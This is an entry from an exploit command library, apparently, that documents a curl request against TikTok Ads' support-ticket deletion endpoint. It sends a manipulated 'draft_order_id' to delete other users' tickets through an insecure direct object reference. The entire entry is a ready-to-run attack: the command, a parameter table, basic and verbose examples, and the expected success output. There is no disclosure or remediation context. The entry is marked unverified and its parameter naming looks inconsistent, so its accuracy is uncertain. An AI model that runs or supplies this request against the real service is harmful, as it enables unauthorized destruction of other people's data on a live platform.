---
data: >-
  curl -X POST 'https://ads.tiktok.com/support/ticket/delete' -H 'Cookie:
  session_id=your_session; auth_token=your_token' -H 'Content-Type:
  application/json' -d '{"draft_order_id": "TARGET_TICKET_ID"}'
tags:
  - web
  - exploit
  - idor
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: edfb8457-14fe-43b7-83ad-c1195f094863
created_at: '2025-12-14T17:25:48.217Z'
updated_at: '2025-12-14T17:25:48.217Z'
verified: false
validated: true
submitted: true
---
# curl-manipulate-draft-order-id

## Command

```bash
curl -X POST 'https://ads.tiktok.com/support/ticket/delete' \
  -H 'Cookie: session_id=your_session; auth_token=your_token' \
  -H 'Content-Type: application/json' \
  -d '{"draft_order_id": "TARGET_TICKET_ID"}'
```

## Description

This curl command exploits an IDOR vulnerability by sending a POST request to the TikTok Ads support ticket deletion endpoint with a manipulated 'draft_order_id' parameter, allowing unauthorized deletion of another user's ticket. Use it in scenarios where direct object references lack authorization checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `'https://ads.tiktok.com/support/ticket/delete'` | The target deletion endpoint URL | Yes |
| `-H 'Cookie: ...'` | Authentication cookies from a valid session | Yes |
| `-H 'Content-Type: application/json'` | Sets the request body format to JSON | Yes |
| `-d '{"draft_order_id": "TARGET_TICKET_ID"}'` | JSON payload with the manipulated ticket ID | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://ads.tiktok.com/support/ticket/delete' \
  -H 'Cookie: session_id=abc123; auth_token=xyz789' \
  -H 'Content-Type: application/json' \
  -d '{"draft_order_id": "12345"}'
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v -X POST 'https://ads.tiktok.com/support/ticket/delete' \
  -H 'Cookie: session_id=abc123; auth_token=xyz789' \
  -H 'Content-Type: application/json' \
  -d '{"draft_order_id": "12345"}'
```

## Expected Output

Successful execution returns an HTTP 200 response with JSON like {"success": true, "message": "Ticket deleted successfully"}. Failure due to invalid ID or auth may return 403 or 404 with error details.

## Related

- [[Related Procedure: Exploit-IDOR-in-TikTok-Support-Ticket-Deletion]]
